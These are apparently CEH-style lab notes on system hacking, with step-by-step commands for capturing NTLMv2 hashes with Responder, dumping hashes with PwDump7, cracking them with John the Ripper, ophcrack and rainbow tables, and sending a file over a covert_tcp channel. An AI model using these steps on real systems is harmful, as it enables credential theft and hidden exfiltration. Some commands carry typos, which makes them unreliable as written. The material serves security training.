# 6 - System Hacking

## Module 06 - System Hacking

**NTLM Hash crack :**

* esponder -I eth0
* usr\share\responder\logs --> Responder log location
* john /usr/share/responder/logs/ntlm.txt

**Rainbow table crack using Winrtgen :**

* Open winrtgen and add new table
* Select ntlm from Hash dropdown list.
* Set Min Len as 4, Max Len as 6 and Chain Count 4000000
* Select loweralpha from Charset dropdown list (it depends upon Password).
* rcrack\_gui.exe to crack hash with rainbow table

**Hash dump with Pwdump7 and crack with ophcrack :**

* `wmic useraccount get name,sid` --> Get user acc names and SID
* PwDump7.exe > c:\hashes.txt
* Replace boxes in hashes.txt with relevant usernames from step 1.
* Ophcrack.exe -> load -> PWDUMP File
* Tables -> Vista free -> select the table directory -> crack

###

### **Perform Active Online Attack to Crack the System's Password using Responder**

#### **Linux:**

* cd
* cd Responder
* chmox +x ./Responder.py
* **sudo ./Responder.py -I eth0**
* passwd: \*\*\*\*

#### **Windows**

* run
* \CEH-Tools

#### **Linux:**

* Home/Responder/logs/SMB-NTMLv2-SSP-**\<Target IP>**txt
* sudo snap install john-the-ripper
* passwd: \*\*\*\*
* **sudo john /home/ubuntu/Responder/logs/SMB-NTLMv2-SSP-10.10.10.10.txt**

### **Covert Channels using Covert\_TCP**

#### **Attacker:**

* cd Desktop
* mkdir Send
* cd Send
* echo "Secret"->message.txt
* Place->Network
* Ctrl+L
* **smb://\<Target IP>**
* Account & Password
* copy and paste covert\_tcp.c
* **cc -o covert\_tcp covert\_tcp.c**

#### **Target:**

* **tcpdump -nvvx port 8888 -I lo**
* cd Desktop
* mkdir Receive
* cd Receive
* File->Ctrl+L
* smb://**\<Target IP>**
* copy and paste covert\_tcp.c
* cc -o covert\_tcp covert\_tcp.c
* **./covert\_tcp -dest 10.10.10.9 -source 10.10.10.13 -source\_port 9999 -dest\_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt**
* **Tcpdump captures no packets**

#### **Attacker**

* **./covert\_tcp -dest 10.10.10.9 -source 10.10.10.13 -source\_port 8888 -dest\_port 9999 -file /home/attacker/Desktop/send/message.txt**
* Wireshark (message string being send in individual packet)
